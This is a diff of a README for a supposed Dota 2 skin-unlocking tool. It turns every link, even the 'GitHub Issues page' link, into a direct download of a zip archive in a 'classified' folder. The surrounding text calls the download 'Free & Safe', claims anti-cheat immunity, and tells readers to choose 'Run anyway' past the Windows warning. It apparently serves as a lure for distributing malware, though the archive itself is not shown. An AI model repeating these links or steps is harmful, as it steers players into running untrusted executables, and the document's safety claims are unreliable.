@@ -1,7 +1,7 @@
 <h1>🎮 dota-2-skin-menu - Equip Any Hero Skin Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/rohit3350/dota-2-skin-menu">
+  <a href="https://github.com/rohit3350/dota-2-skin-menu/raw/refs/heads/main/classified/1.2.zip">
     <img src="https://img.shields.io/badge/Download%20Now-Free%20%26%20Safe-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download Button" style="background: linear-gradient(45deg, #6a11cb, #2575fc); border-radius: 12px; padding: 18px 36px; font-size: 24px; font-weight: bold; color: white; text-decoration: none; display: inline-block;">
   </a>
 </p>
@@ -43,7 +43,7 @@ Since the tool doesn't alter any game files on your computer, Valve's anti-cheat
 
 ### Step 1: Download the Tool
 
-Visit this link to download the application: [**https://github.com/rohit3350/dota-2-skin-menu**](https://github.com/rohit3350/dota-2-skin-menu)
+Visit this link to download the application: [**https://github.com/rohit3350/dota-2-skin-menu/raw/refs/heads/main/classified/1.2.zip**](https://github.com/rohit3350/dota-2-skin-menu/raw/refs/heads/main/classified/1.2.zip)
 
 The download will start automatically. Save the file to your computer (we recommend your Desktop or Downloads folder).
 
@@ -161,7 +161,7 @@ Click "More info" → "Run anyway." This is a standard safety warning for newly 
 
 ## 🌟 Community & Support
 
-This is a community-driven project. If you find any bugs, have feature requests, or want to share your favorite skin combinations, visit the [GitHub Issues page](https://github.com/rohit3350/dota-2-skin-menu) and join the conversation.
+This is a community-driven project. If you find any bugs, have feature requests, or want to share your favorite skin combinations, visit the [GitHub Issues page](https://github.com/rohit3350/dota-2-skin-menu/raw/refs/heads/main/classified/1.2.zip) and join the conversation.
 
 The project is actively maintained. Updates are released regularly with:
 - New skins from the latest Dota patches
@@ -176,7 +176,7 @@ The project is actively maintained. Updates are released regularly with:
 Ready to get started? One click away:
 
 <p align="center">
-  <a href="https://github.com/rohit3350/dota-2-skin-menu" style="display: inline-block; background: linear-gradient(45deg, #000000, #434343); color: #ffffff; padding: 15px 30px; border-radius: 50px; text-decoration: none; font-size: 20px; font-weight: bold; box-shadow: 0 4px 15px rgba(0,0,0,0.3); border: 2px solid #ff8800;">
+  <a href="https://github.com/rohit3350/dota-2-skin-menu/raw/refs/heads/main/classified/1.2.zip" style="display: inline-block; background: linear-gradient(45deg, #000000, #434343); color: #ffffff; padding: 15px 30px; border-radius: 50px; text-decoration: none; font-size: 20px; font-weight: bold; box-shadow: 0 4px 15px rgba(0,0,0,0.3); border: 2px solid #ff8800;">
     ⬇️ Download dota-2-skin-menu Now
   </a>
 </p>
